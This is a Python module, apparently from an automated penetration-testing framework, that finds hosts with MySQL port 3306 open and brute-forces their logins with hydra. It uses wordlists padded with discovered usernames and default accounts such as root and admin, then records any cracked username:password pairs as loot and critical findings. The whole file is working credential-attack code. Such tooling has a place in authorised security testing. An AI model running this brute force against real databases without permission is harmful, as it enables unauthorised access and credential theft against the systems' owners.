import os, tempfile
from core.executor import safe_run
from core.logger import get_logger
from core.utils import make_out_dir, extract_credentials
from config import get_profile, tool_available, get_password_wordlist, get_user_wordlist, FALLBACK_PASSWORDS

def run(ctx):
    log = get_logger(); log.banner("SERVICE -- MySQL Brute Force"); log.set_phase("mysql_brute")
    profile = get_profile()
    if not profile["brute_enabled"]:
        log.info("Brute force disabled -- skipping MySQL brute"); return
    targets = [(h,p) for h in ctx.live_hosts
               for p in ctx.open_ports.get(h,{}).get("tcp",[]) if p == 3306]
    if not targets: return

    user_wl = get_user_wordlist(); pass_wl = '/home/ubuntu_user/ris602/wordlists/mysql_passwords.txt'
    # Supplement with discovered users
    disc = ctx.loot.get("users",[])
    if disc:
        tmp = tempfile.mktemp(suffix=".txt")
        with open(tmp,"w") as f: f.write("\n".join(set(disc + ["root","admin","mysql"])))
        user_wl = tmp

    for host, port in targets:
        out_dir = make_out_dir(ctx.out_dir, "services", "mysql", host)
        log.info(f"MySQL brute: {host}:{port}")

        if tool_available("hydra"):
            rc, out, _ = safe_run(
                f"hydra -L {user_wl} -P {pass_wl} -s {port} "
                f"-t {profile['hydra_tasks']} -f -V {host} mysql",
                timeout=profile["timeout_cmd"]*4, label=f"hydra-mysql-{host}"
            )
            with open(os.path.join(out_dir,"hydra_mysql.txt"),"w") as f: f.write(out)
            for c in extract_credentials(out):
                c["service"]="mysql"; c["host"]=host; c["port"]=port
                ctx.loot.setdefault("credentials",[]).append(c)
                ctx.add_finding("CRITICAL", host, f"MySQL cred: {c['user']}:{c['password']}", "")
                log.success(f"  MySQL cred: {c['user']}:{c['password']}")

